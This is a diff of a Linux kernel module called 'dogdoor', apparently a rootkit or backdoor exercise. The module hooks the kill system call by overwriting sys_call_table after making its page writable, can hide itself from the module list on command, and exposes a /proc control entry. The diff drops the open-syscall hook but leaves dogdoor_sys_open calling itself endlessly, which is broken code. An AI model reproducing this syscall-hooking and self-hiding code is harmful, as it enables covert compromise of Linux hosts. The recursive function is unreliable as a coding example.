@@ -13,9 +13,8 @@
 
 MODULE_LICENSE("GPL");
 
-char filepath[128] = { 0x0, } ;
+char filecmd[128] = { 0x0, } ;
 void ** sctable ;
-int count = 0 ;
 
 static
 struct module_node{
@@ -63,12 +62,11 @@ void module_unhide (void) {
 	hidden = 0;
 }
 
-
-asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 
-
-asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t mode)
+static
+int dogdoor_sys_open(const char __user * filename, int flags, umode_t mode)
 {
 	char fname[256] ;
+
 	char cmd[] = "hide";
 	char cmd2[] = "unhide";
 
@@ -80,13 +78,7 @@ asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t
 	if (strcmp (fname, cmd2) ==0) {
 		module_unhide();
 	}
-
-	/*if (filepath[0] != 0x0 && strcmp(filepath, fname) == 0) {
-		count++ ;
-		module_unhide();
-	}*/
-
-	return orig_sys_open(filename, flags, mode) ;
+	return dogdoor_sys_open(filename, flags, mode);
 }
 
 asmlinkage long (*orig_sys_kill)(pid_t pid, int sig) ; 
@@ -115,7 +107,7 @@ ssize_t dogdoor_proc_read(struct file *file, char __user *ubuf, size_t size, lof
 	char buf[256] ;
 	ssize_t toread ;
 
-	sprintf(buf, "%s:%d\n", filepath, count) ;
+	sprintf(buf, "%s\n", filecmd) ;
 
 	toread = strlen(buf) >= *offset + size ? size : strlen(buf) - *offset ;
 
@@ -138,8 +130,7 @@ ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t si
 	if (copy_from_user(buf, ubuf, size))
 		return -EFAULT ;
 
-	sscanf(buf,"%s", filepath) ;
-	count = 0 ;
+	sscanf(buf,"%s", filecmd) ;
 	*offset = strlen(buf) ;
 
 	return *offset ;
@@ -163,13 +154,11 @@ int __init dogdoor_init(void) {
 
 	sctable = (void *) kallsyms_lookup_name("sys_call_table") ;
 
-	orig_sys_open = sctable[__NR_open] ;
 	orig_sys_kill = sctable[__NR_kill] ;
 
 	pte = lookup_address((unsigned long) sctable, &level) ;
 	if (pte->pte &~ _PAGE_RW) 
 		pte->pte |= _PAGE_RW ;		
-	sctable[__NR_open] = dogdoor_sys_open ;
 	sctable[__NR_kill] = dogdoor_sys_kill ;
 
 	return 0;
@@ -181,7 +170,6 @@ void __exit dogdoor_exit(void) {
 	pte_t * pte ;
 	remove_proc_entry("dogdoor", NULL) ;
 
-	sctable[__NR_open] = orig_sys_open ;
 	sctable[__NR_kill] = orig_sys_kill ;
 
 	pte = lookup_address((unsigned long) sctable, &level) ;
